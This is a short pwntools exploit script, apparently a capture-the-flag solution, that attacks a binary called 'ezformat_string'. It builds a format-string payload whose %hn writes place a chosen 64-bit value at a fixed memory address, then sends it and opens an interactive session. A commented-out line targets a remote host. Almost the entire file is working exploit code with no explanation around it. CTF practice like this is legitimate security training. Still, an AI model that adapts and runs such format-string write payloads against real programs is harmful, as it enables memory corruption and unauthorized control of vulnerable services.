from pwnlib.util.packing import u64
from pwnlib.util.packing import u32
from pwnlib.util.packing import u16
from pwnlib.util.packing import u8
from pwnlib.util.packing import p64
from pwnlib.util.packing import p32
from pwnlib.util.packing import p16
from pwnlib.util.packing import p8
from pwn import *
from ctypes import *
context(os='linux', arch='amd64', log_level='debug')
p = process("/home/zp9080/PWN/ezformat_string")
# p=gdb.debug("/home/zp9080/PWN/pwn",'b *0x4013D2')
# p=remote('1.95.81.93',57777)
# p=process(['seccomp-tools','dump','/home/zp9080/PWN/pwn'])
# elf = ELF("/home/zp9080/PWN/pwn")
# libc=elf.libc 

#b *$rebase(0x14F5)
def dbg():
    gdb.attach(p,'b *0x40121A')
    pause()

magic=0x4CA2F0
num=0x32107654ba98fedc
# dbg()
payload=f"%{0x3210}c%16$hn%{0x7654-0x3210}c%17$hn%{0xba98-0x7654}c%18$hn%{0xfedc-0xba98}c%19$hn".encode()
payload=payload.ljust(0x50,b'a')
payload+=p64(magic+6)+p64(magic+4)+p64(magic+2)+p64(magic)
# print(len(payload))

p.send(payload)

p.interactive()






